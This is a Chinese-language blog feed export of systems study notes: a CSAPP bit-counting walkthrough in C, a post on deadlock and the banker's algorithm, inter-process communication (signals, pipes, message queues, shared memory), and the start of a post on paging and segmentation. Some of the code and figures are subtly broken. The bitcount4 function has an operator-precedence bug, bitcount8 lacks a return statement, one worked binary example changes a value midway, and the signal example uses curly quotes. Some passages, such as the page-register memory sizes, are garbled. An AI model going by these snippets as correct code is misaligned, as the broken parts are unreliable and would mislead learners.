<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitcount4</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mask1=<span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">int</span> mask2=<span class="number">0x3</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=(x&amp;mask1)+(x&gt;&gt;<span class="number">1</span>)&amp;mask1;</span><br><span class="line">    ans=(ans&amp;mask2)+(ans&gt;&gt;<span class="number">2</span>)&amp;mask2;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来我们考虑八位的情况<br>例如01111001，01111001&amp;01010101=01010001,01111001&gt;&gt;1=00111100;<br>00101100&amp;01010101=00010100,00010100+01010001=01100101;<br>每二位分别有1，2，1，1个1<br>接下来计算每四位中1的个数<br>01100101&amp;00110011=00100001，01100101&gt;&gt;2=00011001;<br>00100001+00010001=00110010<br>每四位分别有3，2个1<br>接下来计算每8位中1的个数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitcount8</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mask1=<span class="number">0x55</span>;</span><br><span class="line">    <span class="keyword">int</span> mask2=<span class="number">0x33</span>;</span><br><span class="line">    <span class="keyword">int</span> mask3=<span class="number">0x0f</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=(x&amp;mask1)+((x&gt;&gt;<span class="number">1</span>)&amp;mask1);</span><br><span class="line">    ans=(ans&amp;mask2)+((ans&gt;&gt;<span class="number">2</span>)&amp;mask2);</span><br><span class="line">    ans=(ans&amp;mask3)+((ans&gt;&gt;<span class="number">4</span>)&amp;mask3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>推广得到32位的计算如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> _mask1 = (<span class="number">0x55</span>)|(<span class="number">0x55</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">int</span> _mask2 = (<span class="number">0x33</span>)|(<span class="number">0x33</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">int</span> _mask3 = (<span class="number">0x0f</span>)|(<span class="number">0x0f</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">int</span> mask1 = _mask1|(_mask1&lt;&lt;<span class="number">16</span>);</span><br><span class="line">  <span class="keyword">int</span> mask2 = _mask2|(_mask2&lt;&lt;<span class="number">16</span>);</span><br><span class="line">  <span class="keyword">int</span> mask3 = _mask3|(_mask3&lt;&lt;<span class="number">16</span>);</span><br><span class="line">  <span class="keyword">int</span> mask4 = (<span class="number">0xff</span>)|(<span class="number">0xff</span>&lt;&lt;<span class="number">16</span>);</span><br><span class="line">  <span class="keyword">int</span> mask5 = (<span class="number">0xff</span>)|(<span class="number">0xff</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> ans = (x &amp; mask1) + ((x&gt;&gt;<span class="number">1</span>) &amp; mask1);</span><br><span class="line">  ans = (ans &amp; mask2) + ((ans&gt;&gt;<span class="number">2</span>) &amp; mask2);</span><br><span class="line">  ans = (ans &amp; mask3) + ((ans&gt;&gt;<span class="number">4</span>) &amp; mask3);</span><br><span class="line">  ans = (ans &amp; mask4) + ((ans&gt;&gt;<span class="number">8</span>) &amp; mask4);</span><br><span class="line">  ans = (ans &amp; mask5) + ((ans&gt;&gt;<span class="number">16</span>) &amp; mask5);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>死锁与进程通信</title>
    <url>/systems/deadlock-ipc/</url>
    <content><![CDATA[<p>由于竞争资源或者通信关系，两个或更多的并发进程各自占有某种资源而又都等待别的进程释放它们所占有的资源的现象称为死锁。这些并发进程循环等待，互不相让，所以形成了死锁的僵持局面，无法向前推进。通信则可以让多个进程进行同步和共享资源。</p>
<a id="more"></a>

<h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><h2 id="进程访问资源的流程"><a href="#进程访问资源的流程" class="headerlink" title="进程访问资源的流程"></a>进程访问资源的流程</h2><p>资源类型R1,R2,……，Rm,例如CPU执行时间、内存空间、I/O设备等</p>
<p>每类资源Ri有Wi个实例</p>
<p>进程访问资源的流程</p>
<ul>
<li><strong>请求/获取</strong> 申请空闲资源</li>
<li><strong>使用/占用</strong> 进程占用资源</li>
<li><strong>释放</strong> 资源状态由占用变成空闲</li>
</ul>
<h2 id="资源分类"><a href="#资源分类" class="headerlink" title="资源分类"></a>资源分类</h2><ul>
<li>可重用资源(Resuable Resource)<ul>
<li>资源不能被删除且在任何时刻只能有一个进程使用</li>
<li>进程释放资源后 其他进程可重用</li>
<li>处理器 I/O通道 存储器 设备</li>
<li>文件(进程访问过程中不能被删除) 数据库 信号量</li>
<li>可能出现死锁(每个进程占用一部分资源并请求其它资源)</li>
</ul>
</li>
<li>消耗资源(Consumable Resource)<ul>
<li>资源创建和消耗</li>
<li>在I/O缓冲区的中断 信号 消息</li>
<li>可能出现死锁(进程间相互等待接受对方的消息)</li>
</ul>
</li>
</ul>
<h2 id="资源分配图"><a href="#资源分配图" class="headerlink" title="资源分配图"></a>资源分配图</h2><p><img src="https://i.loli.net/2019/07/29/5d3e674039de655749.png"></p>
<h2 id="死锁的必要条件"><a href="#死锁的必要条件" class="headerlink" title="死锁的必要条件"></a>死锁的必要条件</h2><ul>
<li>互斥<ul>
<li>任何时刻只能有一个进程使用一个资源实例</li>
</ul>
</li>
<li>持有并等待<ul>
<li>进程保持至少一个资源，并正在等待获取其他进程持有的资源</li>
</ul>
</li>
<li>非抢占<ul>
<li>资源只能在进程使用后自愿释放</li>
</ul>
</li>
<li>循环等待</li>
</ul>
<h2 id="死锁处理办法"><a href="#死锁处理办法" class="headerlink" title="死锁处理办法"></a>死锁处理办法</h2><ul>
<li>死锁预防(Deadlock Prevention)<ul>
<li>确保系统永远不会进入死锁状态(资源利用效率低)</li>
</ul>
</li>
<li>死锁避免(Deadlock Avoidance)<ul>
<li>在使用前进行判断 只允许不会出现死锁的进程请求资源</li>
</ul>
</li>
<li>死锁检测和恢复(Deadlock Detection &amp; Recovery)<ul>
<li>在检测到系统进入死锁状态后，进行恢复</li>
</ul>
</li>
</ul>
<h2 id="死锁预防"><a href="#死锁预防" class="headerlink" title="死锁预防"></a>死锁预防</h2><p>预防是采取某种策略，限制并发进程对资源的请求，使系统在任何时刻都不满足死锁的必要条件。</p>
<ul>
<li>互斥<ul>
<li>把互斥的共享资源封装成可同时访问(缓冲区内部协调)</li>
</ul>
</li>
<li>持有并等待<ul>
<li>进程请求资源时 要求它不持有任何其他资源</li>
<li>仅允许进程在开始执行时，一次请求所有需要的资源</li>
<li>资源利用率低</li>
</ul>
</li>
<li>非抢占<ul>
<li>如进程请求不能立即分配的资源则释放已占有资源(主动放弃)</li>
<li>只在能够同时获得所有需要资源时 才执行分配操作</li>
</ul>
</li>
<li>循环等待<ul>
<li>对资源排序，要求进程按顺序请求资源</li>
<li>资源利用率低</li>
</ul>
</li>
</ul>
<h2 id="死锁避免"><a href="#死锁避免" class="headerlink" title="死锁避免"></a>死锁避免</h2><p>利用额外的先验信息在分配资源时判断是否会出现死锁，只在不会死锁时分配资源</p>
<ul>
<li>要求进程声明需要资源的最大数目</li>
<li>限定提供与分配的资源数量,确保满足进程的最大需求(类似于银行贷款)</li>
<li>动态检查资源分配状态 确保不会出现环形等待</li>
</ul>
<p><strong>系统资源分配时的安全状态</strong></p>
<p>系统处于安全状态</p>
<ul>
<li><p>针对所有已占有进程，存在安全序列</p>
</li>
<li><p>序列&lt;P1, P2, …, PN&gt; 是安全的</p>
</li>
<li><p>Pi要求的资源 &lt;= 当前可用资源 + 所有Pj持有资源，其中 j &lt; i</p>
</li>
<li><p>如Pi的资源请求不能立即分配 则Pi等待所有Pj(j &lt; i) 完成</p>
</li>
<li><p>Pi完成后 P(i+1)可得到所需资源 执行并释放所分配的资源</p>
</li>
<li><p>最终整个序列的所有Pi都能获得所需资源</p>
</li>
</ul>
<p><strong>安全状态与死锁状态的关系</strong></p>
<ul>
<li>系统处于安全状态,一定没有死锁</li>
<li>系统处于不安全状态,可能出现死锁</li>
</ul>
<p><strong>银行家算法</strong>(死锁避免算法)</p>
<p>线程在第一次申请资源的时候声明所需最大资源量，在满足所有资源要求并完成后及时释放资源。</p>
<p>同时在线程申请资源不超过操作系统拥有资源最大值时，操作系统应尽量满足线程的需求。</p>
<p><strong>银行家算法数据结构</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; 线程数量 m &#x3D; 资源类型数量</span><br><span class="line">Max(总需求量) n x m 矩阵</span><br><span class="line">线程Ti最多请求类型Rj的资源Max[i, j]个实例</span><br><span class="line">Available(剩余空闲量) 长度为 m 的向量</span><br><span class="line">当前有Available[i]个类型Rj的资源可用</span><br><span class="line">Allocation(已分配量) &#x3D; n x m 矩阵</span><br><span class="line">当前分配了Allocation[i, j]个资源实例</span><br><span class="line">Need(未来需要量) &#x3D; n x m 矩阵</span><br><span class="line">未来需要Need[i, j]个资源实例</span><br><span class="line">Need[i, j] &#x3D; Max[i, j] - Allocation[i, j]</span><br></pre></td></tr></table></figure>
<p><strong>银行家算法安全状态判断</strong></p>
<p>即判断当前资源是否满足某一线程的未来需要</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Work &#x3D; Available &#x2F;&#x2F; 当前资源剩余空闲量</span><br><span class="line">Finish[i] &#x3D; false for i : 1, 2, ..., n &#x2F;&#x2F; 线程i没结束</span><br></pre></td></tr></table></figure>
<ol>
<li>Work 和 Finish 分别是长度为 m 和 n 的向量，初始化二者</li>
<li>寻找线程Ti:<ul>
<li>Finish[i] = false</li>
<li>接下来找出Need比Work小的进程，Need[i] &lt;= Work</li>
<li>没有找到满足条件的线程，转4</li>
</ul>
</li>
<li>存在满足条件的线程，线程Ti可以正常运行，结束后其占用资源可以回收<ul>
<li>Work = Work + Allocation[i]</li>
<li>Finish[i] = true</li>
<li>转 2</li>
</ul>
</li>
<li>若所有线程Ti满足 Finish[i] == true,则为安全状态</li>
</ol>
<p><strong>银行家算法流程</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">init: Requesti 线程Ti的资源请求向量</span><br><span class="line">      Requesti[j] 线程Ti请求资源Rj的实例</span><br><span class="line">循环:</span><br><span class="line">1.如果 Requesti ≤ Need[i], 转到步骤2。否则, 拒绝资源申请, 因为线程已经超过了其最大要求</span><br><span class="line">2.如果 Requesti ≤ Available, 转到步骤3。否则, Ti 必须等待, 因为资源不可用</span><br><span class="line">3.通过安全状态判断来确定是否分配资源给Ti: 生成一个需要判断状态是否安全的资源分配环境</span><br><span class="line">Available &#x3D; Available - Requesti;</span><br><span class="line">Allocation[i] &#x3D; Allocation[i] + Requesti;</span><br><span class="line">Need[i]&#x3D; Need[i] – Requesti;</span><br><span class="line">若安全 则分配资源给Ti</span><br><span class="line">若不安全 则拒绝Ti的资源请求</span><br></pre></td></tr></table></figure>
<p><strong>银行家算法示例</strong></p>
<p>按照序列 <code>T2-&gt;T1-&gt;T3-&gt;T4</code> 运行不存在死锁</p>
<p><img src="https://i.loli.net/2019/07/29/5d3e8d5db415e75776.png"></p>
<p><img src="https://i.loli.net/2019/07/29/5d3e8d7ed6ac850896.png"></p>
<p><img src="https://i.loli.net/2019/07/29/5d3e8d9e8ff5046200.png"></p>
<p>若银行家算法存在多个满足条件的线程，则多个线程之间的先后顺序并不重要，因为这些进程的资源最后都会释放，之后可以满足需求更大的线程资源请求。</p>
<h2 id="死锁检测"><a href="#死锁检测" class="headerlink" title="死锁检测"></a>死锁检测</h2><ul>
<li>允许系统进入死锁状态(分配时不判断)</li>
<li>维护系统的资源分配图</li>
<li>定期调用死锁检测算法来搜索图中是否存在死锁</li>
<li>出现死锁时，用死锁恢复机制进行恢复</li>
</ul>
<p><strong>死锁检测算法数据结构</strong></p>
<p>与银行家算法相比，没有最大资源请求判断。</p>
<p>Available(剩余空闲量)：长度为m的向量，当前有Available[i]个类型Rj的资源可用</p>
<p>Allocation(已分配量)：n * m矩阵，当前每个进程已分配了Allocation[i, j]个资源实例</p>
<ol>
<li>初始化 Work 和 Finish:<ul>
<li>Work = Available // work为当前资源剩余量</li>
<li>Allocation[i] &gt; 0时 Finish[i] = false 否则为 true // 线程是否完成</li>
</ul>
</li>
<li>寻找线程Ti满足:<ul>
<li>Finish[i] = false // 线程没有结束 且 此线程需要的资源量小于剩余资源量</li>
<li>Requesti &lt;= Work</li>
<li>若没有找到这样的i，转到4</li>
</ul>
</li>
<li>将找到的线程拥有的资源释放回当前空闲资源<ul>
<li>Work = Work + Allocation[i]</li>
<li>Finish[i] = true</li>
<li>转到2</li>
</ul>
</li>
<li>检查所有线程的 Finish 若有一个为 false ，系统处于死锁状态</li>
</ol>
<p>算法需要O(n^2 x m) 操作检测是否系统处于死锁状态，每次检查m，检查n^2轮。</p>
<p><strong>死锁检测算法的使用</strong></p>
<ul>
<li>死锁检测的时间和周期选择依据<ul>
<li>死锁多久可能会发生</li>
<li>多少进程需要被回滚</li>
</ul>
</li>
<li>资源图可能有多个循环<ul>
<li>难于分辨造成死锁的关键进程</li>
</ul>
</li>
</ul>
<p><strong>死锁恢复</strong></p>
<p>死锁恢复有进程终止和资源抢占两种方法</p>
<blockquote>
<p>进程终止</p>
</blockquote>
<p>可以选择终止所有死锁的进程，也可以一次只终止一个进程直到死锁消除</p>
<p>终止进程的顺序应该是</p>
<ul>
<li>进程的优先级(选最低的)</li>
<li>进程已运行时间以及还需运行时间(运行时间越长越考虑留下，占用系统资源时间久)</li>
<li>进程已占用资源</li>
<li>进程完成需要的资源</li>
<li>终止进程数目(越少越好)</li>
<li>进程是交互还是批处理(让交互进程继续执行)</li>
</ul>
<blockquote>
<p>资源抢占</p>
</blockquote>
<ul>
<li><strong>选择被抢占进程</strong>(成本最小的)</li>
<li><strong>进程回退</strong> 返回到一些安全状态 重启进程到安全状态</li>
<li><strong>可能出现饥饿</strong> 同一进程可能一直被选作抢占者</li>
</ul>
<h1 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h1><p>进程通信(IPC Inter-Process Communication)是进程进行通信和同步的机制，不同进程通信机制不同。</p>
<ul>
<li>IPC提供2个基本操作<ul>
<li>发送操作 send(message)</li>
<li>接受操作 receive(message)</li>
</ul>
</li>
<li>进程通信流程<ul>
<li>在通信进程间建立通信链路</li>
<li>通过 send/receive 交换信息</li>
</ul>
</li>
<li>进程链路特征<ul>
<li>物理(共享内存 硬件总线)</li>
<li>逻辑(逻辑属性)</li>
</ul>
</li>
</ul>
<p><strong>进程通信实现与划分</strong></p>
<ul>
<li>进程通信实现<ul>
<li>间接通信</li>
<li>直接通信</li>
</ul>
</li>
<li>进程通信可划分为<ul>
<li>阻塞与非阻塞通信</li>
</ul>
</li>
</ul>
<h2 id="直接通信"><a href="#直接通信" class="headerlink" title="直接通信"></a>直接通信</h2><ul>
<li>进程必须正确命名对方</li>
<li>通信链路的属性<ul>
<li>自动建立链路</li>
<li>一条链路恰好对应一对通信进程</li>
<li>每对进程之间只有一个链路存在</li>
<li>链路可以为单向，但通常为双向</li>
</ul>
</li>
</ul>
<p>两个进程必须同时存在通信才可以进行。</p>
<h2 id="间接通信"><a href="#间接通信" class="headerlink" title="间接通信"></a>间接通信</h2><p>每个消息队列都有一个唯一的标识，只有共享了相同消息队列的进程才能够通信</p>
<ul>
<li>通信链路属性<ul>
<li>只有共享了相同消息队列的进程 才建立连接</li>
<li>连接可以为单向也能为双向</li>
<li>消息队列可以与多个进程相关联</li>
</ul>
</li>
<li>间接通信流程<ol>
<li>创建一个新的消息队列</li>
<li>通过消息队列发送和接受消息(只关注消息队列信息，与进程无关)</li>
<li>销毁消息队列</li>
</ol>
</li>
</ul>
<h2 id="阻塞与非阻塞通信"><a href="#阻塞与非阻塞通信" class="headerlink" title="阻塞与非阻塞通信"></a>阻塞与非阻塞通信</h2><p><strong>阻塞通信</strong></p>
<ul>
<li>阻塞发送<ul>
<li>发送者在发送消息后进入等待 直到接受者成功收到</li>
</ul>
</li>
<li>阻塞接受<ul>
<li>接受者在请求接受消息后进入等待 直到成功收到消息</li>
</ul>
</li>
</ul>
<p><strong>非阻塞通信</strong></p>
<ul>
<li>非阻塞发送<ul>
<li>发送者在消息发送后 可立即进行其他操作</li>
<li>没有消息发送时 接受者在请求接受消息后 接受不到任何消息(可以做别的事)</li>
</ul>
</li>
</ul>
<h2 id="通信链路缓冲"><a href="#通信链路缓冲" class="headerlink" title="通信链路缓冲"></a>通信链路缓冲</h2><p>进程发送的消息在链路上可能有三种缓冲方式</p>
<ul>
<li>0 容量<ul>
<li>发送方必须等待接收方(必须有接收方)</li>
</ul>
</li>
<li>有限容量<ul>
<li>通信链路缓冲队列满时 发送方必须等待</li>
</ul>
</li>
<li>无限容量<ul>
<li>发送方不需要等待</li>
</ul>
</li>
</ul>
<h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><p><strong>信号(Signal)</strong> 进程间的软件中断通知和处理机制(SIGKILL SIGSTOP SIGCONT)</p>
<ul>
<li>信号的接受处理<ul>
<li>捕获(Catch) 执行进程指定的信号处理函数被调用</li>
<li>忽略(Ignore) 执行操作系统指定的缺省处理(进程终止 进程挂起)</li>
<li>屏蔽(Mask) 禁止进程接受和处理信号(可能是暂时的 当处理同样类型的信号)</li>
</ul>
</li>
<li>不足<ul>
<li>传送的信息量小 只有一个信号类型</li>
</ul>
</li>
</ul>
<p><img src="https://i.loli.net/2019/07/29/5d3e94a63b8fc91655.png"></p>
<p><strong>信号使用示例</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigproc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; 		</span><br><span class="line">signal(SIGINT, sigproc);   <span class="comment">/* NOTE some versions of UNIX will reset </span></span><br><span class="line"><span class="comment">				* signal to default after each call. So for </span></span><br><span class="line"><span class="comment">				* portability reset signal each time */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(“you have pressed ctrl-c - disabled \n”);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quitproc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; 		 </span><br><span class="line">	<span class="built_in">printf</span>(“ctrl-\\ pressed to quit\n”);   <span class="comment">/* this is “ctrl” &amp; “\” */</span></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* normal exit status */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123; </span><br><span class="line">signal(SIGINT, sigproc);    <span class="comment">/* DEFAULT ACTION: term */</span></span><br><span class="line">signal(SIGQUIT, quitproc);  <span class="comment">/* DEFAULT ACTION: term */</span></span><br><span class="line">	<span class="built_in">printf</span>(“ctrl-c disabled use ctrl-\\ to quit\n”);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(;;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p> <strong>管道(Pipe)</strong> 进程间基于内存文件的通信机制,实现只需要基于内存即可，不需要创建磁盘上文件。</p>
<ul>
<li>子进程从父进程继承文件描述符</li>
<li>缺省文件描述符 0 stdin, 1 stdout, 2 stderr</li>
</ul>
<p><strong>管道相关系统调用</strong></p>
<ul>
<li>读管道 read() scanf() 是基于它实现的</li>
<li>写管道 write() printf() 是基于它实现的</li>
<li>创建管道 pipe(rgfd)<ul>
<li>rgfd是2个文件描述符组成的数组</li>
<li>rgfd[0] 是读文件描述符</li>
<li>rgfd[1] 是写文件描述符</li>
</ul>
</li>
</ul>
<p><strong>管道示例</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3e95b4e1aee47363.png"></p>
<h2 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h2><p><img src="https://i.loli.net/2019/07/29/5d3e96141d0de36295.png"></p>
<p><strong>消息队列的系统调用</strong></p>
<p>msgget()</p>
<ul>
<li>获取消息队列标识</li>
</ul>
<p>msgsnd()</p>
<ul>
<li>发送消息</li>
</ul>
<p>msgrcv()</p>
<ul>
<li>接收消息</li>
</ul>
<p>msgctl()</p>
<ul>
<li>消息队列控制</li>
<li>消息队列独立于创建它的进程，所以需要有系统调用完成消息队列的创建和销毁。</li>
</ul>
<h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>共享内存是把同一个物理内存区域同时映射到多个进程的内存地址空间的通信机制</p>
<ul>
<li>进程<ul>
<li>每个进程都有私有内存地址空间</li>
<li>每个进程的内存地址空间需明确设置共享内存段</li>
</ul>
</li>
<li>线程<ul>
<li>同一进程中的线程总是共享相同的内存地址空间</li>
</ul>
</li>
<li>优点<ul>
<li>快速 方便地共享数据</li>
</ul>
</li>
<li>不足<ul>
<li>必须用额外的同步机制来协调数据访问</li>
</ul>
</li>
</ul>
<p><strong>共享内存的实现</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3e96dae52ed70516.png"></p>
<p>共享内存不提供同步，因此需要有信号量等同步机制协调共享内存的访问冲突。</p>
<ul>
<li>shmget()<ul>
<li>创建共享段</li>
</ul>
</li>
<li>shmat()<ul>
<li>把共享段映射到进程地址空间</li>
</ul>
</li>
<li>shmdt()<ul>
<li>取消共享段到进程地址空间的映射</li>
</ul>
</li>
<li>shmctl()<ul>
<li>共享段的控制</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>非连续内存分配算法</title>
    <url>/systems/dvmm/</url>
    <content><![CDATA[<p>连续内存分配内存利用效率比较低，无法适应动态修改。非连续内存分配通过允许分配非连续物理内存空间来解决问题，其中根据分块标准的不同，分为以段为单位的段式存储管理和以页为单位的页式存储管理。段式内存便于内存保护，而页式内存便于内存转移，将二者折衷又引入了段页式存储管理。</p>
<a id="more"></a>

<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>连续内存的缺点：</p>
<ul>
<li>物理内存必须连续</li>
<li>存在外碎片和内碎片</li>
<li>内存分配的动态修改困难</li>
<li>内存利用率较低</li>
</ul>
<p>非连续分配的设计目标：提高内存利用效率和管理灵活</p>
<ul>
<li>允许一个程序使用非连续的物理地址空间</li>
<li>允许共享代码与数据</li>
<li>支持动态加载和动态链接</li>
</ul>
<p><strong>非连续内存分配的实现</strong></p>
<blockquote>
<p>如何实现虚拟地址和物理地址的转换：不同的逻辑地址可能位于不连续的物理区域中</p>
</blockquote>
<ul>
<li>软件实现（灵活，开销大）</li>
<li>硬件实现（够用，开销小）</li>
</ul>
<blockquote>
<p>如何选择非连续分配中的内存分块大小？内碎片、外碎片问题？</p>
</blockquote>
<p>段式存储管理（segmentation）：分块大，以段为单位<br>页式存储管理（paging）：分块小，以页为单位</p>
<h1 id="段式存储管理"><a href="#段式存储管理" class="headerlink" title="段式存储管理"></a>段式存储管理</h1><h2 id="段地址空间"><a href="#段地址空间" class="headerlink" title="段地址空间"></a>段地址空间</h2><p>进程的段地址空间由多个段组成：<br>• 主代码段<br>• 子模块代码段<br>• 公用库代码段<br>• 堆栈段（stack）<br>• 堆数据（heap）<br>• 初始化数据段<br>• 符号表等</p>
<p>段式存储管理的目的：更细粒度和灵活的分离与共享。</p>
<p>段式地址空间的不连续二维结构</p>
<p><img src="https://i.loli.net/2019/07/27/5d3b8b8ee04ff11870.png"></p>
<p>段地址空间的逻辑视图</p>
<p><img src="https://i.loli.net/2019/07/27/5d3b8bbc75c4068840.png"></p>
<h2 id="段访问机制"><a href="#段访问机制" class="headerlink" title="段访问机制"></a>段访问机制</h2><blockquote>
<p>段的概念</p>
</blockquote>
<ul>
<li>段表示访问方式和存储数据等属性相同的一段地址空间</li>
<li>对应一个连续的内存“块”</li>
<li> 若干个段组成进程逻辑地址空间</li>
</ul>
<p>段访问：逻辑地址由二元组        段号addr  段内偏移</p>
<ul>
<li>(s，addr)表示s</li>
<li>段号addr  段内偏移</li>
</ul>
<p>由单地址方案转换为”段基址+段内偏移”</p>
<p><strong>段访问的硬件实现</strong></p>
<p><img src="https://i.loli.net/2019/07/27/5d3b8ca5a692a17089.png"></p>
<ol>
<li>首先从逻辑地址中取出段号和偏移量</li>
<li>在段表中以段号为索引，查找对应的段描述符，得到段基址和段长度</li>
<li>由MMU判断偏移量是否大于段长度，若大于，则内存异常</li>
<li>偏移量与段基址相加得到物理地址，根据物理地址访问对应的内容</li>
</ol>
<h1 id="页式存储管理"><a href="#页式存储管理" class="headerlink" title="页式存储管理"></a>页式存储管理</h1><h2 id="基本单位"><a href="#基本单位" class="headerlink" title="基本单位"></a>基本单位</h2><blockquote>
<p>物理页面</p>
</blockquote>
<p>页帧（Page Frame）<br>• 把物理地址空间划分为大小相同的基本分配单位<br>• $2$，如512,4096,8192，4k是常用大小</p>
<blockquote>
<p>逻辑页面</p>
</blockquote>
<p>页面（Page）<br>• 把逻辑地址空间也划分为相同大小的基本分配单位<br>• 帧和页的大小必须是相同的</p>
<blockquote>
<p>页面到页帧之间的转换</p>
</blockquote>
<p>• 逻辑地址到物理地址的转换<br>• 页表<br>• MMU/TLB 使转换高效进行</p>
<h2 id="页到页帧"><a href="#页到页帧" class="headerlink" title="页到页帧"></a>页到页帧</h2><p><strong>页帧物理地址计算</strong></p>
<p><img src="https://i.loli.net/2019/07/27/5d3b8fe4e58d066683.png"></p>
<p><strong>页逻辑地址计算</strong></p>
<p><img src="https://i.loli.net/2019/07/27/5d3b908d4f3c116363.png"></p>
<p><strong>页式存储中的地址映射</strong></p>
<blockquote>
<p>如何将页映射到帧</p>
</blockquote>
<ul>
<li>逻辑地址中的页号是连续的，物理地址中的页号是不连续的</li>
<li>不是所有页都有对应的帧</li>
<li>页表保存了逻辑地址与物理地址之间的映射关系</li>
</ul>
<h2 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h2><p><strong>页表结构</strong></p>
<p>每个进程都有一个页表</p>
<ul>
<li>每个页面对应一个页表项</li>
<li> 随进程运行状态而动态变化（可以动态调整内存空间大小）</li>
<li> 页表基址寄存器：PTBR，Page Table Base Register 存储页表基地址</li>
</ul>
<p><img src="https://i.loli.net/2019/07/27/5d3b91b76c36360461.png"></p>
<blockquote>
<p>页表项组成</p>
</blockquote>
<p>帧号：f</p>
<p>页表项标志：</p>
<ul>
<li><strong>存在位(reside bit)</strong> 逻辑页面是否存在对应的物理帧</li>
<li><strong>修改位(dirty bit，又称为脏位)</strong>  对应页面中内容是否被修改了</li>
<li><strong>引用位(clock/reference bit)</strong> 在过去一段事件内是否访问过页中内容</li>
</ul>
<p><strong>性能问题</strong></p>
<ul>
<li>访问一个内存单元需要2次内存访问 (内存访问性能问题)<ul>
<li>第一次访问获取页表项</li>
<li>第二次访问获取数据</li>
</ul>
</li>
<li>页表大小可能会很大</li>
</ul>
<blockquote>
<p>如何解决页式存储的性能问题</p>
</blockquote>
<ul>
<li><strong>缓存 (Caching)</strong> 缓存页表项 ，根据局部性原理，之后极大可能再次访问，从而减少访问次数。例如TLB</li>
<li><strong>间接访问 (Indirection)</strong> 将页表项分为多级，逐级访问，比如多级页表</li>
</ul>
<h2 id="快表"><a href="#快表" class="headerlink" title="快表"></a>快表</h2><p><img src="https://i.loli.net/2019/07/27/5d3b96de83b1371477.png"></p>
<p>关联存储器：有一组key，可以并行地查找所有表项，得到匹配项</p>
<p>快表(Translation look-aside buffer)位于CPU中，所以速度块，成本高，功耗大。</p>
<blockquote>
<p>快表（TLB）与高速缓存（cache）有什么不同？</p>
</blockquote>
<p>TLB：缓存页表项</p>
<p>Cache：缓存内存地址对应的数据</p>
<h2 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h2><p><img src="https://i.loli.net/2019/07/27/5d3b97ba9b16d15315.png"></p>
<p>针对大地址空间，多级页表变得繁琐。</p>
<p>页寄存器和反置页面的思路：</p>
<ul>
<li>不让页表与逻辑地址空间的大小相对应</li>
<li>让页表与物理地址空间的大小相对应</li>
</ul>
<h2 id="页寄存器"><a href="#页寄存器" class="headerlink" title="页寄存器"></a>页寄存器</h2><p>每个帧与一个页寄存器（Page Register）关联，寄存器内容包括：</p>
<ul>
<li>使用位（Residence bit）：此帧是否被进程占用</li>
<li>占用页号（Occupier）：对应的页号p</li>
<li> 保护位（Protection bits）：设置该页的访问方式，比如可读，可写。</li>
</ul>
<p><strong>页寄存器示例</strong></p>
<ul>
<li>物理内存大小：40964096=4K*4KB=16MB</li>
<li>页面大小：4096bytes=4KB</li>
